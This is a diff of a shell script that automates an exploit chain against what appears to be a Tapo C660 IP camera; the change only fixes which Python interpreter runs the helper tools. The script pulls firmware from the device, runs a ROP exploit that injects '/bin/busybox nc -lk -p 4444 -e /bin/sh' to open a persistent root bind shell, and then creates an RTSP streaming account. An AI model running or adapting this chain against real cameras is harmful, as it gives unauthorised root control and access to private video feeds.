@@ -33,7 +33,9 @@ WAIT="${WAIT:-120}"
 POST_TOOL="${POST_TOOL:-$HERE/tapo_post.py}"
 ROP_TOOL="${ROP_TOOL:-$HERE/tapo_connectap_rop.py}"
 ROUTE_CMD="${ROUTE_CMD:-sudo -n route add -host}"
-PY="${PY:-python3}"
+# launchd's PATH has no homebrew, so a bare python3 is the 3.9 framework build; both tools
+# are PEP-604 annotated. Never let PATH decide the interpreter here.
+PY="${PY:-/opt/homebrew/bin/python3}"
 
 # The decoded build (c660_fw.bin.dec → BCL1 block 5 → cpio → /bin/main, 4 575 320 bytes) and the
 # chain find_chain derives from it. Both are pinned by tests/c660_postshell_test.py.
@@ -70,7 +72,7 @@ wait_shell "$WAIT" || die "no shell on $HOST:$SHELL_PORT within ${WAIT}s" 3
 log "shell present — recon + pull"
 
 # --- 1. recon and pulls ----------------------------------------------------------------------
-"$POST_TOOL" "$HOST" --pull --port "${PORT:-5555}" 2>&1 | tee -a "$LOG"
+"$PY" "$POST_TOOL" "$HOST" --pull --port "${PORT:-5555}" 2>&1 | tee -a "$LOG"
 [ -s "$OUT/proc_mtd" ] || die "/proc/mtd pull is empty" 2
 [ -s "$OUT/bin_main" ] || die "/bin/main pull is empty" 2
 log "pulled $(wc -c < "$OUT/proc_mtd") B of mtd map and $(wc -c < "$OUT/bin_main") B of /bin/main"
@@ -84,7 +86,7 @@ log "decoded image     = $WANT_HASH"
 log "binary identity matches — the offline chain applies"
 
 # --- 3. repeatable ROP shell -----------------------------------------------------------------
-"$ROP_TOOL" "$HOST" --offset "$OFFSET" --pop "$POP" --pivot "$PIVOT" --system "$SYSTEM" \
+"$PY" "$ROP_TOOL" "$HOST" --offset "$OFFSET" --pop "$POP" --pivot "$PIVOT" --system "$SYSTEM" \
   --cmd "/bin/busybox nc -lk -p 4444 -e /bin/sh &" 2>&1 | tee -a "$LOG"
 sleep 2
 wait_shell "$WAIT" || die "the ROP shell never came back — repeat the ROP by hand" 5
@@ -93,14 +95,14 @@ log "repeatable root shell up"
 [ "$SKIP_RTSP" = 1 ] && { log "RTSP skipped (--skip-rtsp)"; exit 0; }
 
 # --- 4. RTSP provisioning (the FSS ingest account) -------------------------------------------
-PASS=$(python3 -c 'import secrets; print(secrets.token_urlsafe(12))')
+PASS=$("$PY" -c 'import secrets; print(secrets.token_urlsafe(12))')
 umask 077
 printf '%s %s\n' fssuser "$PASS" > "$OUT/rtsp_cred.txt"
 umask 022
-"$POST_TOOL" "$HOST" --rtsp-enable --rtsp-user fssuser --rtsp-pass "$PASS" \
+"$PY" "$POST_TOOL" "$HOST" --rtsp-enable --rtsp-user fssuser --rtsp-pass "$PASS" \
   --rtsp-reset 2>&1 | tee -a "$LOG" || die "RTSP provisioning was not accepted" 6
 log "config accepted; soft reset sent — waiting for the unit to return"
-"$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
+"$PY" "$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
   --wait "${RTSP_WAIT:-10}" 2>&1 | tee -a "$LOG" || die "554 does not serve with the account" 6
 
 log "ENDSTATE reached — account in $OUT/rtsp_cred.txt"
